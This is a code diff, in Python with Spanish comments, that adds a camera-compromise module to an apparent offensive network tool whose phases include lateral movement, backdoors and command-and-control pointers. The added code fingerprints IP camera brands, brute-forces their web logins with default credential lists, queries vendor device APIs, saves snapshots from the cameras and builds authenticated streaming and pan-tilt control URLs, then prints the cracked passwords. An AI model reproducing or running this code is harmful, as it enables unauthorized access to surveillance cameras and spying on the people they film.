@@ -60,6 +60,7 @@ class SimplifyWFB:
                 'users_created': [],
                 'remote_connections': [],
                 'c2_pointers': [],
+                'cameras_accessed': [],
                 'errors': []
             },
             'phase_5_verification': {
@@ -88,8 +89,11 @@ class SimplifyWFB:
             'scan_timeout': 30,
             'max_threads': 10,
             'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
+            'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999],
             'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
-            'default_passwords': ['admin', 'password', '123456', 'root', 'guest', '']
+            'default_passwords': ['admin', 'password', '123456', 'root', 'guest', ''],
+            'camera_users': ['admin', 'administrator', 'root', 'guest', 'user', 'camera', 'ipcam', 'webcam', 'viewer', 'operator'],
+            'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123']
         }
         
         # Detectar configuración de red automáticamente
@@ -1124,6 +1128,11 @@ quit
             c2_pointers = self._setup_c2_pointers(compromised)
             self.report['phase_4_persistence']['c2_pointers'] = c2_pointers
             
+            # 5. Acceder a cámaras detectadas
+            print("📹 Accediendo a cámaras detectadas...")
+            cameras_accessed = self._access_detected_cameras()
+            self.report['phase_4_persistence']['cameras_accessed'] = cameras_accessed
+            
             self.report['phase_4_persistence']['status'] = 'completed'
             print(f"✅ Persistencia completada: {len(users)} usuarios, {len(backdoors)} backdoors")
             
@@ -1436,6 +1445,388 @@ WantedBy=multi-user.target
             pointers.append(pointer)
         
         return pointers
+    
+    def _access_detected_cameras(self) -> List[Dict[str, Any]]:
+        """Acceder a cámaras detectadas en la red"""
+        cameras_accessed = []
+        
+        # Buscar cámaras en servicios encontrados
+        services = self.report['phase_1_reconnaissance']['services_found']
+        cameras = self._identify_camera_services(services)
+        
+        for camera in cameras:
+            print(f"📹 Procesando cámara: {camera['host']}:{camera['port']}")
+            
+            # Intentar acceso a la cámara
+            camera_access = self._exploit_camera(camera)
+            if camera_access:
+                cameras_accessed.append(camera_access)
+                print(f"✅ Acceso exitoso a cámara: {camera['host']}")
+            else:
+                print(f"❌ Falló acceso a cámara: {camera['host']}")
+        
+        return cameras_accessed
+    
+    def _identify_camera_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Identificar servicios que podrían ser cámaras"""
+        cameras = []
+        
+        for service in services:
+            # Verificar si es un puerto común de cámara
+            if service['port'] in self.config['camera_ports']:
+                # Verificar si el servicio sugiere que es una cámara
+                service_name = service.get('service', '').lower()
+                version = service.get('version', '').lower()
+                
+                camera_indicators = [
+                    'http', 'https', 'rtsp', 'camera', 'ipcam', 'webcam',
+                    'dvr', 'nvr', 'surveillance', 'security', 'monitor'
+                ]
+                
+                if any(indicator in service_name or indicator in version for indicator in camera_indicators):
+                    camera = {
+                        'host': service['host'],
+                        'port': service['port'],
+                        'service': service['service'],
+                        'version': service['version'],
+                        'protocol': 'http' if service['port'] in [80, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999] else 'rtsp',
+                        'detected_as_camera': True
+                    }
+                    cameras.append(camera)
+                
+                # También agregar si está en puertos específicos de cámaras
+                elif service['port'] in [554, 1935]:  # RTSP, RTMP
+                    camera = {
+                        'host': service['host'],
+                        'port': service['port'],
+                        'service': service['service'],
+                        'version': service['version'],
+                        'protocol': 'rtsp',
+                        'detected_as_camera': True
+                    }
+                    cameras.append(camera)
+        
+        return cameras
+    
+    def _exploit_camera(self, camera: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Explotar cámara específica"""
+        try:
+            # 1. Detectar tipo de cámara
+            camera_type = self._detect_camera_type(camera)
+            
+            # 2. Intentar credenciales por defecto
+            credentials = self._brute_force_camera_credentials(camera)
+            
+            if credentials:
+                # 3. Obtener información de la cámara
+                camera_info = self._get_camera_information(camera, credentials)
+                
+                # 4. Tomar screenshots de prueba
+                screenshots = self._capture_camera_screenshots(camera, credentials)
+                
+                # 5. Generar URLs de acceso
+                access_urls = self._generate_camera_urls(camera, credentials)
+                
+                return {
+                    'host': camera['host'],
+                    'port': camera['port'],
+                    'protocol': camera['protocol'],
+                    'camera_type': camera_type,
+                    'credentials': credentials,
+                    'camera_info': camera_info,
+                    'screenshots': screenshots,
+                    'access_urls': access_urls,
+                    'timestamp': time.time()
+                }
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error explotando cámara {camera['host']}: {e}")
+            return None
+    
+    def _detect_camera_type(self, camera: Dict[str, Any]) -> str:
+        """Detectar tipo de cámara"""
+        try:
+            # Hacer request HTTP para detectar tipo
+            import urllib.request
+            import urllib.error
+            
+            url = f"http://{camera['host']}:{camera['port']}/"
+            
+            req = urllib.request.Request(url)
+            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                html_content = response.read().decode('utf-8', errors='ignore')
+                
+                # Detectar marcas comunes
+                if 'hikvision' in html_content.lower():
+                    return 'hikvision'
+                elif 'dahua' in html_content.lower():
+                    return 'dahua'
+                elif 'axis' in html_content.lower():
+                    return 'axis'
+                elif 'foscam' in html_content.lower():
+                    return 'foscam'
+                elif 'dlink' in html_content.lower():
+                    return 'dlink'
+                elif 'tp-link' in html_content.lower():
+                    return 'tp-link'
+                elif 'xiaomi' in html_content.lower():
+                    return 'xiaomi'
+                else:
+                    return 'generic_ip_camera'
+                    
+        except Exception as e:
+            print(f"⚠️ No se pudo detectar tipo de cámara: {e}")
+            return 'unknown'
+    
+    def _brute_force_camera_credentials(self, camera: Dict[str, Any]) -> Optional[Dict[str, str]]:
+        """Fuerza bruta específica para cámaras"""
+        try:
+            import urllib.request
+            import urllib.error
+            import base64
+            
+            for username in self.config['camera_users']:
+                for password in self.config['camera_passwords']:
+                    try:
+                        # Crear autenticación básica
+                        auth_string = f"{username}:{password}"
+                        auth_bytes = auth_string.encode('ascii')
+                        auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+                        
+                        # Intentar acceso
+                        url = f"http://{camera['host']}:{camera['port']}/"
+                        req = urllib.request.Request(url)
+                        req.add_header('Authorization', f'Basic {auth_b64}')
+                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                        
+                        with urllib.request.urlopen(req, timeout=5) as response:
+                            if response.status == 200:
+                                print(f"✅ Credenciales encontradas: {username}:{password}")
+                                return {'username': username, 'password': password}
+                                
+                    except urllib.error.HTTPError as e:
+                        if e.code == 401:  # Unauthorized
+                            continue
+                        elif e.code == 200:  # Success
+                            print(f"✅ Credenciales encontradas: {username}:{password}")
+                            return {'username': username, 'password': password}
+                    except Exception:
+                        continue
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error en fuerza bruta de cámara: {e}")
+            return None
+    
+    
+    def _get_camera_information(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Dict[str, Any]:
+        """Obtener información detallada de la cámara"""
+        try:
+            import urllib.request
+            import base64
+            import json
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            camera_info = {
+                'model': 'unknown',
+                'firmware': 'unknown',
+                'resolution': 'unknown',
+                'features': [],
+                'capabilities': []
+            }
+            
+            # Intentar obtener información de la página principal
+            try:
+                url = f"http://{camera['host']}:{camera['port']}/"
+                req = urllib.request.Request(url)
+                req.add_header('Authorization', f'Basic {auth_b64}')
+                
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    html_content = response.read().decode('utf-8', errors='ignore')
+                    
+                    # Extraer información básica del HTML
+                    if 'resolution' in html_content.lower():
+                        camera_info['resolution'] = 'detected'
+                    if 'ptz' in html_content.lower():
+                        camera_info['features'].append('ptz')
+                    if 'night' in html_content.lower() or 'ir' in html_content.lower():
+                        camera_info['features'].append('night_vision')
+                    if 'audio' in html_content.lower():
+                        camera_info['features'].append('audio')
+                    
+            except Exception:
+                pass
+            
+            # Intentar obtener información de API si está disponible
+            api_endpoints = [
+                '/api/system/deviceInfo',
+                '/cgi-bin/magicBox.cgi?action=getDeviceType',
+                '/cgi-bin/global.cgi',
+                '/api/v1/device/info'
+            ]
+            
+            for endpoint in api_endpoints:
+                try:
+                    url = f"http://{camera['host']}:{camera['port']}{endpoint}"
+                    req = urllib.request.Request(url)
+                    req.add_header('Authorization', f'Basic {auth_b64}')
+                    
+                    with urllib.request.urlopen(req, timeout=5) as response:
+                        if response.status == 200:
+                            content = response.read().decode('utf-8', errors='ignore')
+                            
+                            # Intentar parsear como JSON
+                            try:
+                                data = json.loads(content)
+                                if 'model' in data:
+                                    camera_info['model'] = data['model']
+                                if 'firmware' in data:
+                                    camera_info['firmware'] = data['firmware']
+                            except:
+                                # Si no es JSON, buscar en texto plano
+                                if 'model' in content.lower():
+                                    camera_info['model'] = 'detected'
+                                if 'firmware' in content.lower():
+                                    camera_info['firmware'] = 'detected'
+                            
+                            break
+                            
+                except Exception:
+                    continue
+            
+            return camera_info
+            
+        except Exception as e:
+            print(f"❌ Error obteniendo información de cámara: {e}")
+            return {'error': str(e)}
+    
+    
+    def _generate_camera_urls(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Dict[str, List[str]]:
+        """Generar URLs de acceso a la cámara"""
+        urls = {
+            'web_interface': [],
+            'streaming': [],
+            'snapshots': [],
+            'control': []
+        }
+        
+        base_url = f"http://{camera['host']}:{camera['port']}"
+        auth_url = f"http://{credentials['username']}:{credentials['password']}@{camera['host']}:{camera['port']}"
+        
+        # Interfaz web
+        urls['web_interface'] = [
+            f"{auth_url}/",
+            f"{auth_url}/index.html",
+            f"{auth_url}/login.html",
+            f"{auth_url}/main.html"
+        ]
+        
+        # Streaming
+        urls['streaming'] = [
+            f"{auth_url}/video.mjpg",
+            f"{auth_url}/mjpeg",
+            f"{auth_url}/stream",
+            f"{auth_url}/live"
+        ]
+        
+        # Capturas
+        urls['snapshots'] = [
+            f"{auth_url}/snapshot.cgi",
+            f"{auth_url}/image",
+            f"{auth_url}/snapshot",
+            f"{auth_url}/jpg"
+        ]
+        
+        # Control
+        urls['control'] = [
+            f"{auth_url}/cgi-bin/ptz.cgi",
+            f"{auth_url}/cgi-bin/control.cgi",
+            f"{auth_url}/api/ptz",
+            f"{auth_url}/control"
+        ]
+        
+        return urls
+    
+    def _capture_camera_screenshots(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> List[str]:
+        """Capturar screenshots de prueba de la cámara"""
+        screenshots = []
+        
+        try:
+            import urllib.request
+            import os
+            import time
+            
+            # Crear directorio para screenshots
+            screenshot_dir = f"camera_screenshots_{int(time.time())}"
+            os.makedirs(screenshot_dir, exist_ok=True)
+            
+            host = camera['host']
+            port = camera['port']
+            
+            print(f"📸 Capturando screenshots de prueba de {host}...")
+            
+            # URLs comunes para captura de imagen
+            snapshot_urls = [
+                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/snapshot.cgi",
+                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/image",
+                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/snapshot",
+                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/jpg",
+                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/jpeg",
+                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/cgi-bin/snapshot.cgi",
+                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/axis-cgi/jpg/image.cgi"
+            ]
+            
+            screenshot_count = 0
+            
+            for i, url in enumerate(snapshot_urls):
+                if screenshot_count >= 2:  # Solo 2 screenshots de prueba
+                    break
+                    
+                try:
+                    req = urllib.request.Request(url)
+                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                    
+                    with urllib.request.urlopen(req, timeout=10) as response:
+                        if response.status == 200:
+                            # Verificar que sea una imagen
+                            content_type = response.headers.get('Content-Type', '')
+                            if 'image' in content_type or 'jpeg' in content_type or 'jpg' in content_type:
+                                screenshot_file = os.path.join(screenshot_dir, f"{host}_screenshot_{screenshot_count + 1}.jpg")
+                                
+                                with open(screenshot_file, 'wb') as f:
+                                    f.write(response.read())
+                                
+                                screenshots.append(screenshot_file)
+                                screenshot_count += 1
+                                
+                                print(f"   ✅ Screenshot {screenshot_count}: {screenshot_file}")
+                                
+                                # Pequeña pausa entre capturas
+                                time.sleep(1)
+                            
+                except Exception as e:
+                    continue
+            
+            if screenshots:
+                print(f"✅ Capturados {len(screenshots)} screenshots de {host}")
+            else:
+                print(f"⚠️ No se pudieron capturar screenshots de {host}")
+            
+            return screenshots
+            
+        except Exception as e:
+            print(f"❌ Error capturando screenshots: {e}")
+            return []
+    
     
     def phase_5_verification(self):
         """Fase 5: Verificación de persistencias"""
@@ -1837,6 +2228,7 @@ WantedBy=multi-user.target
         self.report['summary']['compromised_hosts'] = len(self.report['phase_3_lateral_movement']['compromised_systems'])
         self.report['summary']['persistent_access_points'] = len(self.report['phase_4_persistence']['users_created']) + len(self.report['phase_4_persistence']['backdoors_created'])
         self.report['summary']['total_credentials'] = len(self.report['phase_2_credentials']['credentials_found'])
+        self.report['summary']['cameras_accessed'] = len(self.report['phase_4_persistence']['cameras_accessed'])
         
         end_time = time.time()
         self.report['summary']['execution_time'] = end_time - self.start_time
@@ -1855,6 +2247,16 @@ WantedBy=multi-user.target
         print(f"⏱️ Tiempo total: {self.report['summary']['execution_time']:.2f} segundos")
         print(f"🎯 Hosts comprometidos: {self.report['summary']['compromised_hosts']}/{self.report['summary']['total_hosts']}")
         print(f"🔒 Puntos de acceso persistentes: {self.report['summary']['persistent_access_points']}")
+        print(f"📹 Cámaras accedidas: {self.report['summary']['cameras_accessed']}")
+        
+        # Mostrar información de cámaras si hay alguna
+        cameras = self.report['phase_4_persistence']['cameras_accessed']
+        if cameras:
+            print("\n📹 CÁMARAS ACCEDIDAS:")
+            for camera in cameras:
+                print(f"   • {camera['host']}:{camera['port']} - {camera.get('camera_type', 'unknown')}")
+                print(f"     Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
+                print(f"     URLs de acceso: {len(camera.get('access_urls', {}).get('web_interface', []))} disponibles")
         
         return report_file
     
@@ -1994,13 +2396,21 @@ def main():
         if choice == '1':
             print("\n🚀 Iniciando Escaneo Completo...")
             report_file = wfb.run_full_scan()
-            print(f"\n✅ Escaneo completado. Reporte: {report_file}")
+            if report_file:
+                print(f"\n✅ Escaneo completado. Reporte: {report_file}")
+                
+            else:
+                print("\n❌ Escaneo cancelado")
             break
             
         elif choice == '2':
             print("\n🧊 Iniciando Pentest Frío...")
             report_file = wfb.run_cold_pentest()
-            print(f"\n✅ Pentest frío completado. Reporte: {report_file}")
+            if report_file:
+                print(f"\n✅ Pentest frío completado. Reporte: {report_file}")
+                
+            else:
+                print("\n❌ Pentest cancelado")
             break
             
         elif choice == '3':
